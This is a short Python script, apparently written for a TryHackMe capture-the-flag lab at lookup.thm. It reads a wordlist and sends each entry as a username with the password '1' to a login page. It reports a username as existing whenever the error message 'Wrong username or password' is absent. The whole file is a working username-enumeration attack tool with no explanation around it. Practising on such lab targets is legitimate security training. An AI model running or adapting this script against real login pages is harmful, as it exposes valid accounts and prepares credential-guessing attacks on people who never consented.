import requests
import argparse


parser = argparse.ArgumentParser(
                    prog='teste',
                    description='What the program does',
                    epilog='Text at the bottom of help')

parser.add_argument('-w', '--wordlists')
args = parser.parse_args()
wordlist = open(args.wordlists, 'r')

for linha in wordlist:
	new = linha[:-1]
	payload = {
		'username': f'{new}',
		'password': "1"
	}
	r = requests.post('http://lookup.thm/login.php', data = payload)
	conteudo = str(r.content, encoding='utf-8')
	if "Wrong username or password" in conteudo:
		pass	
	else:
		print("USername exist= ", linha)



